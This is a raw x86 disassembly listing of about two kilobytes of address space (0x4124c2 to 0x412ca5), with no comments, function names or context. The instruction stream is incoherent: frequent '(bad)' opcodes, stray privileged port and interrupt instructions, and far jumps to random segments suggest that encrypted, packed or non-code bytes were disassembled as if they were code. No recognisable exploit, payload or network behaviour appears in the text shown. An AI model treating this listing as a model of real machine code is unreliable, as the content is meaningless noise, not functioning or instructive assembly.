  4124c2:	loope  0x412534
  4124c4:	fadd   DWORD PTR [ecx-0x4d]
  4124c7:	push   cs
  4124c8:	lods   al,BYTE PTR ds:[esi]
  4124c9:	pop    ds
  4124ca:	xor    edi,DWORD PTR [ebp+0x11]
  4124cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ce:	sti    
  4124cf:	adc    eax,0xe6d2bf67
  4124d4:	mov    edi,0x4ca65039
  4124d9:	jne    0x412472
  4124db:	les    edx,FWORD PTR [ebx]
  4124dd:	sbb    BYTE PTR [ebx-0x129b46a1],bl
  4124e3:	mov    esp,0xd06e6baf
  4124e8:	inc    edi
  4124e9:	jno    0x4124c1
  4124eb:	mov    ch,0xb1
  4124ed:	xchg   esi,eax
  4124ee:	ret    
  4124ef:	jg     0x412478
  4124f1:	enter  0x7e13,0xac
  4124f5:	adc    dh,bh
  4124f7:	xchg   ecx,eax
  4124f8:	xchg   esp,eax
  4124f9:	imul   edi,DWORD PTR [ecx+0x25],0xffffffc0
  4124fd:	sbb    al,0x3a
  4124ff:	test   eax,0x64aa00f4
  412504:	dec    edi
  412505:	sub    BYTE PTR [esi-0x50],dh
  412508:	stos   BYTE PTR es:[edi],al
  412509:	push   ecx
  41250a:	rcr    DWORD PTR [ecx-0x352e7164],1
  412510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412511:	(bad)  
  412513:	pop    ebx
  412514:	loop   0x41258a
  412516:	test   eax,0x758d3eba
  41251b:	ds push ecx
  41251d:	repnz mov edx,0xe364e0c8
  412523:	aas    
  412524:	mov    esi,0x53fa7770
  412529:	rcl    DWORD PTR [esi-0x54],1
  41252c:	mov    eax,0x65124659
  412531:	fs xchg ecx,esp
  412534:	rcr    DWORD PTR ds:0x35e8a79e,0x95
  41253b:	sub    DWORD PTR [edx+0x65],edx
  41253e:	sbb    al,0x57
  412540:	dec    ebx
  412541:	pop    eax
  412542:	inc    esp
  412543:	jne    0x412562
  412545:	adc    al,0x8b
  412547:	cmp    dl,dh
  412549:	mov    edi,0x3587d5de
  41254e:	dec    esp
  41254f:	jnp    0x4125b8
  412551:	pop    es
  412552:	adc    ebp,DWORD PTR [esi-0x2ed777d7]
  412558:	and    eax,0x5c16b803
  41255d:	push   0x469a2e03
  412562:	mov    edx,0x6e9bd8bc
  412567:	xchg   DWORD PTR [ecx+edx*2-0x41],eax
  41256b:	and    al,0xbf
  41256d:	push   cs
  41256e:	shl    bl,0x97
  412571:	iret   
  412572:	mov    dh,0x13
  412574:	xchg   DWORD PTR [edi-0x32],edx
  412577:	pop    ds
  412578:	cmp    esi,edi
  41257a:	cmp    edi,0x9b32b4e7
  412580:	into   
  412581:	ins    BYTE PTR es:[edi],dx
  412582:	mov    edx,0x888c21b4
  412587:	ins    BYTE PTR es:[edi],dx
  412588:	imul   esp,DWORD PTR [esi-0x6a],0xffffffd7
  41258c:	mov    ds:0x45038269,al
  412591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412592:	pop    ss
  412593:	(bad)  
  412594:	dec    ebp
  412595:	mov    edx,0xf71127d6
  41259a:	cmp    ch,0x0
  41259d:	stos   BYTE PTR es:[edi],al
  41259e:	xchg   esi,eax
  41259f:	mov    edi,0xd23ccfdc
  4125a4:	int    0xac
  4125a6:	jle    0x4125c4
  4125a8:	push   edx
  4125a9:	(bad)  
  4125ab:	test   eax,0x65d2da6c
  4125b0:	mov    al,0x72
  4125b2:	mov    ds:0x5f7ab73b,eax
  4125b7:	daa    
  4125b8:	pop    esp
  4125b9:	jnp    0x412561
  4125bb:	mov    edx,0x1c10b972
  4125c0:	cmp    bl,BYTE PTR [eax-0x80]
  4125c3:	retf   0x8d30
  4125c6:	jp     0x4125f3
  4125c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125c9:	sub    eax,eax
  4125cb:	mov    bl,0x9f
  4125cd:	imul   esi,DWORD PTR [ebp+0x3e457c28],0x4c
  4125d4:	add    BYTE PTR [ecx-0x4c],bl
  4125d7:	js     0x412614
  4125d9:	outs   dx,DWORD PTR ds:[esi]
  4125da:	or     esp,eax
  4125dc:	push   ebx
  4125dd:	clc    
  4125de:	rcl    ch,cl
  4125e0:	jmp    0xc11f:0xa85b05c6
  4125e7:	xchg   edi,eax
  4125e8:	xchg   esp,eax
  4125e9:	loope  0x412606
  4125eb:	call   0xeeb889ad
  4125f0:	inc    esp
  4125f1:	cmc    
  4125f2:	in     al,0x9
  4125f4:	loope  0x4125e2
  4125f6:	xchg   ecx,eax
  4125f7:	pop    ecx
  4125f8:	dec    edi
  4125f9:	shl    BYTE PTR [edi+0x2299b48c],1
  4125ff:	and    DWORD PTR [edi],edx
  412601:	push   eax
  412602:	rol    BYTE PTR [edi-0x1d],1
  412605:	add    ah,BYTE PTR [ebx+eax*2]
  412608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412609:	ror    BYTE PTR [esi+0x218a2712],cl
  41260f:	mov    bl,0x7d
  412611:	aad    0xec
  412613:	mov    ebx,DWORD PTR [edi+0x5b33fdd5]
  412619:	xor    al,0x1e
  41261b:	mov    BYTE PTR [edx],dl
  41261d:	loopne 0x412622
  41261f:	xor    BYTE PTR [ebx+0x79],dh
  412622:	mov    ebp,DWORD PTR [edx+0x57]
  412625:	inc    ebx
  412626:	jb     0x41261e
  412628:	pusha  
  412629:	pop    ecx
  41262a:	push   eax
  41262b:	les    edx,FWORD PTR [edx+0x4541e123]
  412631:	aaa    
  412632:	push   ebx
  412633:	repnz pushf 
  412635:	xor    al,0x1b
  412637:	xchg   DWORD PTR [ecx-0x40],ebp
  41263a:	jmp    0x41266d
  41263c:	not    esp
  41263e:	sbb    BYTE PTR [ebx+eax*1+0x7c6ac9d2],ah
  412645:	pop    esi
  412646:	shl    DWORD PTR [eax-0x1559808c],cl
  41264c:	scas   eax,DWORD PTR es:[edi]
  41264d:	fmul   QWORD PTR [edx-0x7c991689]
  412653:	inc    esp
  412654:	(bad)  [edi-0x5c]
  412657:	sbb    al,0x91
  412659:	push   0x48
  41265b:	es lock xchg dl,ah
  41265f:	hlt    
  412660:	or     eax,0xf7b12ae7
  412665:	cmp    bl,BYTE PTR [edx+eax*8+0x1e7b1277]
  41266c:	jg     0x412675
  41266e:	popf   
  41266f:	out    0x40,eax
  412671:	(bad)  
  412672:	mov    bh,0x3e
  412674:	mov    bl,0xb1
  412676:	xor    BYTE PTR [eax+edi*2],bh
  412679:	data16 and bh,BYTE PTR [eax+edi*8+0x7b]
  41267e:	mov    ds:0x5566d407,eax
  412683:	jbe    0x4126e0
  412685:	mov    esp,0xb74e63d
  41268a:	inc    eax
  41268b:	inc    BYTE PTR [edi-0x13]
  41268e:	push   es
  41268f:	adc    BYTE PTR [ecx-0x2c],cl
  412692:	jge    0x4126cb
  412694:	hlt    
  412695:	xor    bh,ah
  412697:	push   0xcdcd767e
  41269c:	sbb    edx,esp
  41269e:	or     BYTE PTR [ebp+0x50f54e8b],0x99
  4126a5:	int3   
  4126a6:	scas   eax,DWORD PTR es:[edi]
  4126a7:	pushf  
  4126a8:	pop    ebp
  4126a9:	jl     0x41269c
  4126ab:	jp     0x412690
  4126ad:	add    DWORD PTR [edx+0x35],esp
  4126b0:	or     bl,dl
  4126b2:	add    eax,0x110aa5b2
  4126b7:	xor    ebx,edx
  4126b9:	mov    esi,0x185fedd
  4126be:	cmovg  ecx,ebx
  4126c1:	in     al,dx
  4126c2:	pushf  
  4126c3:	add    al,0x22
  4126c5:	idiv   BYTE PTR [ebx-0x11616e14]
  4126cb:	mov    bl,0x48
  4126cd:	add    al,0x1c
  4126cf:	call   0xd633926c
  4126d4:	dec    ebx
  4126d5:	add    DWORD PTR [ecx+esi*1],esi
  4126d8:	push   0x6c173144
  4126dd:	push   ebp
  4126de:	sub    ch,dl
  4126e0:	outs   dx,DWORD PTR ds:[esi]
  4126e1:	push   esi
  4126e2:	sub    al,0x85
  4126e4:	dec    ebx
  4126e5:	add    dh,ah
  4126e7:	ret    0xceca
  4126ea:	(bad)  
  4126eb:	jbe    0x412695
  4126ed:	pop    ebp
  4126ee:	sbb    ah,BYTE PTR [ebx+0x262feb13]
  4126f4:	sbb    al,0xfc
  4126f6:	add    al,0xd2
  4126f8:	pop    eax
  4126f9:	sbb    dh,BYTE PTR [edx-0x6bdbabf8]
  4126ff:	fnstenv [ebx+0x28]
  412702:	and    edx,DWORD PTR [ebx+0x4e]
  412705:	lea    edi,[ebp-0x7dbc0150]
  41270b:	adc    DWORD PTR [ebx+0x74c67014],0x57800198
  412715:	xor    DWORD PTR [ecx-0x73f8c2a2],ebx
  41271b:	or     eax,0x924b34ec
  412720:	and    al,0xba
  412722:	scas   al,BYTE PTR es:[edi]
  412723:	xor    cl,ah
  412725:	shl    DWORD PTR [edx-0x11],1
  412728:	and    esi,eax
  41272a:	and    eax,DWORD PTR [ecx+0x67cd6da1]
  412730:	stc    
  412731:	pop    esi
  412732:	jbe    0x4126fd
  412734:	xor    DWORD PTR [ebx-0x7c678bba],eax
  41273a:	lods   eax,DWORD PTR ds:[esi]
  41273b:	dec    edx
  41273c:	fmul   DWORD PTR [ecx+0x65]
  41273f:	cmp    BYTE PTR [esi+0x3d467f6b],0xed
  412746:	ss repz dec edi
  412749:	js     0x41273e
  41274b:	shr    BYTE PTR ds:0xed95cca7,cl
  412751:	mov    edx,0xdef225f3
  412756:	xor    al,0x42
  412758:	push   ss
  412759:	sub    BYTE PTR [ebp+0x7816efd8],cl
  41275f:	mov    edi,0x84495346
  412764:	pop    ebp
  412765:	xchg   ecx,eax
  412766:	loop   0x4127d0
  412768:	xor    eax,0xa2ed7913
  41276d:	call   0x64528b23
  412772:	dec    edx
  412773:	or     al,0xce
  412775:	fist   DWORD PTR [ecx+ebp*1+0x13]
  412779:	popa   
  41277a:	shl    DWORD PTR [esi],cl
  41277c:	push   ss
  41277d:	pop    ecx
  41277e:	adc    al,BYTE PTR [ecx-0x4f]
  412781:	lahf   
  412782:	jmp    0xb86bdc00
  412787:	fs dec ecx
  412789:	or     esi,edi
  41278b:	sbb    edx,ecx
  41278d:	sahf   
  41278e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41278f:	jne    0x41280d
  412791:	jle    0x41272e
  412793:	push   ebp
  412794:	xchg   DWORD PTR ds:0xfb4f7530,edi
  41279a:	sbb    DWORD PTR [ebx-0x17304a91],esi
  4127a0:	push   ecx
  4127a1:	cs call 0xa34e:0x18547b67
  4127a9:	call   0x4268f568
  4127ae:	or     eax,0xd84919c1
  4127b3:	imul   edi,DWORD PTR [eax-0x66d18474],0x67
  4127ba:	add    al,0x38
  4127bc:	out    0x2,al
  4127be:	jmp    0x2419:0x65ed00a2
  4127c5:	les    ebp,FWORD PTR [edi]
  4127c7:	or     DWORD PTR [ebp-0x53],0x8865d407
  4127ce:	mov    ch,0x20
  4127d0:	mov    DWORD PTR [bx-0x7280],edi
  4127d5:	push   esi
  4127d6:	sub    al,0x77
  4127d8:	add    DWORD PTR [ebp+0x4eedc222],ebx
  4127de:	dec    ebx
  4127df:	dec    ebp
  4127e0:	jno    0x41278d
  4127e2:	imul   edi,DWORD PTR [edi],0x1c50c299
  4127e8:	loope  0x41283c
  4127ea:	xchg   esp,eax
  4127eb:	bound  ebx,QWORD PTR [ebx-0x799df6da]
  4127f1:	and    ecx,DWORD PTR [eax+0x42eed45]
  4127f7:	xlat   BYTE PTR ds:[ebx]
  4127f8:	je     0x4127eb
  4127fa:	jg     0x4127cb
  4127fc:	pop    eax
  4127fd:	mov    bl,BYTE PTR [edx]
  4127ff:	mov    ch,0x62
  412801:	daa    
  412802:	lock mov esi,0xb087aec0
  412808:	lods   al,BYTE PTR es:[esi]
  41280a:	add    ebx,eax
  41280c:	add    DWORD PTR [ecx-0x64],esi
  41280f:	mov    esi,0xb822f96b
  412814:	jecxz  0x412867
  412816:	fsubr  st,st(0)
  412818:	adc    DWORD PTR [ebx],eax
  41281a:	mov    ch,0x3f
  41281c:	push   DWORD PTR [edx-0x1fb391c4]
  412822:	jge    0x4127f9
  412824:	cmp    al,0xd0
  412826:	sar    BYTE PTR [eax],cl
  412828:	inc    edi
  412829:	aaa    
  41282a:	ins    DWORD PTR es:[edi],dx
  41282b:	mov    bp,0xba9d
  41282f:	int3   
  412830:	cmp    DWORD PTR [edi+eax*4-0x5c],eax
  412834:	xchg   esp,eax
  412835:	neg    BYTE PTR [edi-0x38c3af9a]
  41283b:	xor    esi,DWORD PTR [ecx-0xe]
  41283e:	xor    BYTE PTR [esi+0x43],al
  412841:	cmp    esi,DWORD PTR [esi-0x1580c2d1]
  412847:	cmp    BYTE PTR [esi],dl
  412849:	lds    edi,FWORD PTR [edi]
  41284b:	mov    esp,0x31cba568
  412850:	push   es
  412851:	adc    ah,BYTE PTR ds:0xa436ee0f
  412857:	ins    BYTE PTR es:[edi],dx
  412858:	push   edx
  412859:	jbe    0x41283b
  41285b:	cld    
  41285c:	mov    eax,0x147a08
  412861:	xor    BYTE PTR [ecx+esi*2],ah
  412864:	lods   eax,DWORD PTR ds:[esi]
  412865:	fiadd  WORD PTR [edx]
  412867:	out    dx,al
  412868:	dec    esp
  412869:	out    0xd,eax
  41286b:	mov    bl,0xfd
  41286d:	shl    DWORD PTR [eax],cl
  41286f:	mov    al,ds:0x17c1f72
  412874:	xor    BYTE PTR [ebx-0x61],cl
  412877:	iret   
  412878:	leave  
  412879:	pop    ebx
  41287a:	stos   BYTE PTR es:[edi],al
  41287b:	(bad)  
  41287c:	mov    ebx,0x9a359a42
  412881:	or     dl,dh
  412883:	push   esi
  412884:	aad    0xb5
  412886:	add    DWORD PTR [edx],esi
  412888:	into   
  412889:	jno    0x412829
  41288b:	xchg   esi,eax
  41288c:	rcl    BYTE PTR [edx-0x72e8dac5],0xbd
  412893:	fadd   QWORD PTR [edx-0x127ec57]
  412899:	(bad)  
  41289a:	imul   ebp,DWORD PTR [ecx+0x11],0xa350b287
  4128a1:	fstp   DWORD PTR [eax+0x1d]
  4128a4:	dec    ebx
  4128a5:	sub    esi,eax
  4128a7:	xor    DWORD PTR [ebp+0x63925b23],esi
  4128ad:	mov    bh,0x71
  4128af:	mov    cl,0x68
  4128b1:	jnp    0x4128a5
  4128b3:	push   0xfffffff7
  4128b5:	test   al,0x9e
  4128b7:	xchg   ebx,eax
  4128b8:	neg    BYTE PTR [ebp+0x3]
  4128bb:	add    ah,bl
  4128bd:	fwait
  4128be:	sbb    dl,BYTE PTR [edi+0x46]
  4128c1:	pop    ds
  4128c2:	pop    ecx
  4128c3:	cwde   
  4128c4:	sub    al,0x7c
  4128c6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4128c8:	pushf  
  4128c9:	rol    BYTE PTR [eax+0x311c63e2],cl
  4128cf:	jnp    0x4128cb
  4128d1:	clc    
  4128d2:	xlat   BYTE PTR ds:[ebx]
  4128d3:	out    dx,eax
  4128d4:	mov    dl,0xbd
  4128d6:	or     ch,BYTE PTR [bp+si]
  4128d9:	scas   eax,DWORD PTR es:[edi]
  4128da:	xchg   BYTE PTR [ebx],dl
  4128dc:	add    DWORD PTR [ebx],0x47c5eec2
  4128e2:	xor    BYTE PTR [edi],dh
  4128e4:	cdq    
  4128e5:	retf   
  4128e6:	adc    BYTE PTR [edi],dl
  4128e8:	fild   DWORD PTR [edi]
  4128ea:	push   ecx
  4128eb:	mov    WORD PTR ds:[edx-0x4820d2e0],cs
  4128f2:	inc    eax
  4128f3:	fidivr WORD PTR [edx+0x76]
  4128f6:	xchg   DWORD PTR [ebx-0xf],esi
  4128f9:	iret   
  4128fa:	xor    edi,DWORD PTR [ebx+0x16f0d2f1]
  412900:	fidiv  DWORD PTR [ebx+0x53]
  412903:	aam    0xae
  412905:	lods   eax,DWORD PTR ds:[esi]
  412906:	sub    ebp,DWORD PTR [ecx]
  412908:	mov    esp,0x7cf604e7
  41290d:	jl     0x412977
  41290f:	add    al,0xc8
  412911:	or     DWORD PTR [edx],edx
  412913:	lods   eax,DWORD PTR ds:[esi]
  412914:	test   al,0x2
  412916:	aas    
  412917:	push   eax
  412918:	daa    
  412919:	les    ebp,FWORD PTR [eax+0x5062e4d6]
  41291f:	pop    ebp
  412920:	ds push 0x5a
  412923:	and    eax,0x62c2ef6e
  412928:	aam    0xd7
  41292a:	jmp    0xcc30953e
  41292f:	and    al,0x55
  412931:	stc    
  412932:	push   0x36a18c7b
  412937:	pop    ebp
  412938:	or     BYTE PTR [ecx],ch
  41293a:	xchg   edi,eax
  41293b:	lea    ebx,[ebx-0x4a326414]
  412941:	out    dx,al
  412942:	int3   
  412943:	das    
  412944:	dec    eax
  412945:	adc    edi,ebp
  412947:	dec    eax
  412948:	in     eax,0x89
  41294a:	stos   DWORD PTR es:[edi],eax
  41294b:	xchg   esp,eax
  41294c:	mov    dl,0x17
  41294e:	jge    0x412919
  412950:	or     al,0x28
  412952:	int3   
  412953:	scas   eax,DWORD PTR es:[edi]
  412954:	(bad)  
  412955:	cmp    BYTE PTR [ebx-0x2515f86e],bl
  41295b:	repz push ebp
  41295d:	cdq    
  41295e:	sbb    DWORD PTR [eax+0x5f],edi
  412961:	mov    eax,0x14f655b0
  412966:	popf   
  412967:	retf   
  412968:	push   esp
  412969:	mov    al,0xd2
  41296b:	mov    bl,0xd5
  41296d:	pop    edi
  41296e:	mov    eax,0xd260b7a1
  412973:	mov    al,ds:0x54ea6834
  412978:	jns    0x412929
  41297a:	mov    ds:0x9666eacc,al
  41297f:	lahf   
  412980:	inc    ebx
  412981:	mov    esi,0xdb1333fe
  412986:	out    dx,al
  412987:	push   ecx
  412988:	or     BYTE PTR [esi-0x73],0xe9
  41298c:	out    0xb9,eax
  41298e:	ins    DWORD PTR es:[edi],dx
  41298f:	jmp    0x349a:0x3c5ab84d
  412996:	pop    edi
  412997:	sbb    bh,BYTE PTR [ebx+eiz*1+0x729dfa5]
  41299e:	xor    ebp,DWORD PTR [ebx]
  4129a0:	dec    eax
  4129a1:	mov    esi,0xb08d8cd3
  4129a6:	mov    si,0x2948
  4129aa:	pop    edi
  4129ab:	adc    edi,DWORD PTR [esi]
  4129ad:	xchg   ebp,eax
  4129ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129af:	push   ebp
  4129b0:	scas   eax,DWORD PTR es:[edi]
  4129b1:	push   ss
  4129b2:	and    DWORD PTR [eax],ebp
  4129b4:	pop    es
  4129b5:	mov    ebp,0xe7d7bccd
  4129ba:	mov    bh,0x76
  4129bc:	in     al,0x30
  4129be:	add    eax,0xfddadbcb
  4129c3:	stos   DWORD PTR es:[edi],eax
  4129c4:	jecxz  0x412a02
  4129c6:	ret    0xe193
  4129c9:	in     eax,0x20
  4129cb:	mov    bh,0x19
  4129cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ce:	lock sbb al,0xba
  4129d1:	inc    edx
  4129d2:	repnz cwde 
  4129d4:	xchg   DWORD PTR [ecx],ecx
  4129d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129d7:	cmc    
  4129d8:	and    edi,DWORD PTR [edx+0x35]
  4129db:	and    al,0x3e
  4129dd:	mov    bl,BYTE PTR [esi+0x11]
  4129e0:	mov    dh,BYTE PTR [edi]
  4129e2:	and    edi,eax
  4129e4:	shr    BYTE PTR [edi+0x77b89c91],cl
  4129ea:	sub    eax,0xdf59c7b0
  4129ef:	or     al,0xff
  4129f1:	jmp    0xf6786fa1
  4129f6:	(bad)  
  4129f9:	pop    esi
  4129fa:	mov    eax,ds:0xd55a6643
  4129ff:	test   BYTE PTR [ecx-0x25],0xd8
  412a03:	loop   0x412a1b
  412a05:	dec    eax
  412a06:	add    DWORD PTR [esi+eiz*2],0x46ebe073
  412a0d:	xor    bh,BYTE PTR [edx]
  412a0f:	ret    
  412a10:	out    dx,eax
  412a11:	sub    al,0x35
  412a13:	dec    ebp
  412a14:	out    dx,eax
  412a15:	mov    eax,ds:0x13a05f61
  412a1a:	jmp    0x412a17
  412a1c:	out    0x17,al
  412a1e:	inc    esp
  412a1f:	xchg   esp,eax
  412a20:	jne    0x412a31
  412a22:	cmp    al,0xa3
  412a24:	push   ss
  412a25:	test   al,0x3a
  412a27:	outs   dx,DWORD PTR fs:[esi]
  412a29:	les    esp,FWORD PTR [esi-0x28]
  412a2c:	stos   DWORD PTR es:[edi],eax
  412a2d:	mov    ebp,ebx
  412a2f:	icebp  
  412a30:	xor    al,0x53
  412a32:	mov    ch,0xb6
  412a34:	out    0x24,eax
  412a36:	push   esi
  412a37:	sub    BYTE PTR [ecx+0x51ed4a2d],ah
  412a3d:	jne    0x4129ec
  412a3f:	xchg   ecx,eax
  412a40:	cmp    eax,0x2fcc778d
  412a45:	clc    
  412a46:	in     al,dx
  412a47:	int    0x12
  412a49:	rcl    dl,cl
  412a4b:	sub    eax,0x96ff9800
  412a50:	sti    
  412a51:	fs mov edi,0xf5de62c1
  412a57:	(bad)  [edx-0x505d5c04]
  412a5d:	mov    ebx,0x6cab230d
  412a62:	sub    cl,BYTE PTR [eax+edx*4]
  412a65:	not    BYTE PTR [edx+0x5600c20f]
  412a6b:	add    ebx,0x65ce1ef6
  412a71:	mov    ss,WORD PTR [eax-0x6fdcc43]
  412a77:	sbb    eax,0xa6eba7e6
  412a7c:	jo     0x412aae
  412a7e:	sahf   
  412a7f:	fdiv   DWORD PTR [edx-0x519777e4]
  412a85:	and    ch,ch
  412a87:	push   0xb684d0dc
  412a8c:	data16 test al,0x9d
  412a8f:	fist   WORD PTR [edx-0x7c]
  412a92:	out    0xbe,eax
  412a94:	out    dx,al
  412a95:	adc    eax,0x7e7dfaa6
  412a9a:	mov    edx,0x8d378f34
  412a9f:	fldl2e 
  412aa1:	mov    ecx,0x8d254a6e
  412aa6:	shl    DWORD PTR gs:[esi+eax*1],cl
  412aaa:	sub    BYTE PTR [edi+ecx*1],dl
  412aad:	and    BYTE PTR [edx],bh
  412aaf:	aad    0x4b
  412ab1:	gs cld 
  412ab3:	out    0x46,eax
  412ab5:	out    0x32,al
  412ab7:	jecxz  0x412ad6
  412ab9:	add    ebx,DWORD PTR [esi]
  412abb:	in     al,0xf7
  412abd:	mov    ch,0x1f
  412abf:	push   ecx
  412ac0:	loope  0x412ae2
  412ac2:	in     eax,0x4
  412ac4:	(bad)  
  412ac5:	jmp    0x34dc:0x95a7164f
  412acc:	nop
  412acd:	xchg   esp,eax
  412ace:	mov    esi,0x21f9abb2
  412ad3:	push   esi
  412ad4:	sbb    DWORD PTR [edi],ebx
  412ad6:	pop    ss
  412ad7:	push   eax
  412ad8:	inc    ecx
  412ad9:	shl    BYTE PTR [eax],cl
  412adb:	test   BYTE PTR [eax+0x5b],ah
  412ade:	jecxz  0x412b45
  412ae0:	inc    ebp
  412ae1:	pop    esi
  412ae2:	jne    0x412a65
  412ae4:	jmp    0xc8f61669
  412ae9:	pop    edi
  412aea:	loope  0x412aaf
  412aec:	xor    BYTE PTR [edx-0x7e5f59b6],ah
  412af2:	leave  
  412af3:	jae    0x412b1e
  412af5:	outs   dx,BYTE PTR ds:[esi]
  412af6:	xor    BYTE PTR [ecx+0x5049fda5],cl
  412afc:	push   edi
  412afd:	jnp    0x412b6a
  412aff:	js     0x412b7d
  412b01:	lea    eax,[eax+0x106b12a0]
  412b07:	ror    ebp,cl
  412b09:	fisttp DWORD PTR [edi-0x44]
  412b0c:	and    dl,BYTE PTR [esi]
  412b0e:	or     al,0xc1
  412b10:	inc    ebx
  412b11:	cmp    eax,0x62d004de
  412b16:	mov    eax,ds:0x400674d3
  412b1b:	leave  
  412b1c:	cli    
  412b1d:	push   ebp
  412b1e:	(bad)  
  412b1f:	xor    ebx,DWORD PTR [edx-0x3efd834b]
  412b25:	mov    edx,0x93612b2f
  412b2a:	pop    si
  412b2c:	lea    ebx,[ebx]
  412b2e:	mov    bh,0x92
  412b30:	outs   dx,DWORD PTR ds:[esi]
  412b31:	or     BYTE PTR [ebp+0x2253b4e3],ah
  412b37:	jmp    0x412b60
  412b39:	mov    al,ds:0xa5f17476
  412b3e:	or     DWORD PTR [esi+esi*4],esi
  412b41:	xor    DWORD PTR [ebx-0x11],eax
  412b44:	inc    esi
  412b45:	or     BYTE PTR [esi-0x4a],cl
  412b48:	ret    0xba38
  412b4b:	retf   
  412b4c:	cmp    al,0x3c
  412b4e:	mov    edx,0x2569aab0
  412b53:	jne    0x412b1d
  412b55:	cmp    al,0x9
  412b57:	push   es
  412b58:	jle    0x412b48
  412b5a:	add    al,0x1f
  412b5c:	test   eax,0xc8634fa1
  412b61:	push   ss
  412b62:	sar    ebp,1
  412b64:	sbb    BYTE PTR [esi-0x24],al
  412b67:	push   ebx
  412b68:	test   eax,0x794356d5
  412b6d:	loopne 0x412ba7
  412b6f:	test   DWORD PTR [edx+0x2372790],esi
  412b75:	ins    BYTE PTR es:[edi],dx
  412b76:	ret    0xdcc2
  412b79:	xor    DWORD PTR [edi+eiz*2-0x4460f8b9],edx
  412b80:	call   0xdd27:0xe4cd34dd
  412b87:	or     BYTE PTR [edx+0x3a817753],ah
  412b8d:	fidivr DWORD PTR [ebx-0x6d]
  412b90:	outs   dx,DWORD PTR ds:[esi]
  412b91:	ins    BYTE PTR es:[edi],dx
  412b92:	jecxz  0x412b5c
  412b94:	outs   dx,DWORD PTR ds:[esi]
  412b95:	je     0x412b60
  412b97:	shr    dl,cl
  412b99:	lahf   
  412b9a:	arpl   WORD PTR [edx],ax
  412b9c:	call   0xdfd2a178
  412ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ba2:	jnp    0x412bd7
  412ba4:	pushf  
  412ba5:	repnz loopne 0x412bfe
  412ba8:	mov    dh,0xc7
  412baa:	fimul  DWORD PTR ds:0xf80ac845
  412bb0:	lods   eax,DWORD PTR ds:[esi]
  412bb1:	push   ebp
  412bb2:	sbb    eax,0xf66f186d
  412bb7:	push   edi
  412bb8:	sub    al,0x8f
  412bba:	mov    cs,WORD PTR [eax+0x5d]
  412bbd:	dec    edi
  412bbe:	inc    esi
  412bbf:	mov    dl,0x64
  412bc1:	fadd   QWORD PTR [ecx-0x3b94e3bb]
  412bc7:	call   0x21c2fc82
  412bcc:	fwait
  412bcd:	loopne 0x412bdb
  412bcf:	(bad)  
  412bd0:	scas   eax,DWORD PTR es:[edi]
  412bd1:	adc    al,0x81
  412bd3:	aas    
  412bd4:	mov    bl,0x8c
  412bd6:	xor    DWORD PTR ds:0xa11f10f4,esp
  412bdc:	jl     0x412c4b
  412bde:	aas    
  412bdf:	sbb    edx,DWORD PTR [ebx+0x5c]
  412be2:	jmp    0xbc0cfaa4
  412be7:	sbb    ch,BYTE PTR [ecx+0x5a]
  412bea:	push   cs
  412beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bec:	add    ecx,DWORD PTR [ebp-0x47]
  412bef:	push   eax
  412bf0:	das    
  412bf1:	inc    esp
  412bf2:	cmc    
  412bf3:	xor    al,0x21
  412bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf6:	adc    al,0xd7
  412bf8:	ret    
  412bf9:	stos   BYTE PTR es:[edi],al
  412bfa:	aas    
  412bfb:	mov    ebp,0x876ec8e3
  412c00:	sbb    DWORD PTR [esp],edx
  412c03:	retf   0x2581
  412c06:	fadd   QWORD PTR [edi]
  412c08:	jno    0x412bb3
  412c0a:	xchg   esi,eax
  412c0b:	pop    ebp
  412c0c:	sar    ah,cl
  412c0e:	mov    bh,0x4
  412c10:	cmp    al,0xd5
  412c12:	leave  
  412c13:	hlt    
  412c14:	sbb    DWORD PTR [edx-0x30],eax
  412c17:	jg     0x412c52
  412c19:	cmp    BYTE PTR [ecx-0x6f971f5],ch
  412c1f:	push   cs
  412c20:	dec    ebp
  412c21:	or     dl,BYTE PTR [esi]
  412c23:	lods   eax,DWORD PTR ds:[esi]
  412c24:	sti    
  412c25:	xor    DWORD PTR [esi+eax*2+0x4b],esp
  412c29:	cmc    
  412c2a:	ss jge 0x412c27
  412c2d:	ret    
  412c2e:	aas    
  412c2f:	lods   eax,DWORD PTR ds:[esi]
  412c30:	test   BYTE PTR [edx*2-0x243781c5],0x49
  412c38:	(bad)  
  412c39:	call   DWORD PTR [edx+0x68e1430d]
  412c3f:	mov    bh,0x2f
  412c41:	dec    ecx
  412c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c43:	inc    bl
  412c45:	and    esi,0x59
  412c48:	jno    0x412c31
  412c4a:	dec    esp
  412c4b:	ja     0x412c67
  412c4d:	cld    
  412c4e:	xchg   edx,eax
  412c4f:	mov    dh,0x30
  412c51:	sub    esp,esi
  412c53:	push   esp
  412c54:	jl     0x412ca6
  412c56:	mov    edx,0xa7e18e0
  412c5b:	hlt    
  412c5c:	mov    ecx,fs
  412c5e:	mov    ch,0x7b
  412c60:	pop    edi
  412c61:	dec    eax
  412c62:	dec    ebx
  412c63:	mov    dh,0xdc
  412c65:	addr16 sub al,0xea
  412c68:	pushf  
  412c69:	sbb    eax,0x4a4454ed
  412c6e:	mov    eax,ds:0xfff7a2ed
  412c73:	adc    eax,0xa7621861
  412c78:	adc    al,0x3f
  412c7a:	or     BYTE PTR [ebp+0x454c456d],al
  412c80:	fbld   TBYTE PTR [esi-0x79730fef]
  412c86:	push   es
  412c87:	daa    
  412c88:	ss mov esp,0xd9758a9f
  412c8e:	mov    bl,0x49
  412c90:	out    dx,al
  412c91:	loope  0x412c36
  412c93:	inc    edx
  412c94:	mov    esp,0x707e43df
  412c99:	punpckldq mm6,DWORD PTR [edi+eax*8+0x4e2fc3e1]
  412ca1:	je     0x412c46
  412ca3:	int    0xbc
  412ca5:	aaa    
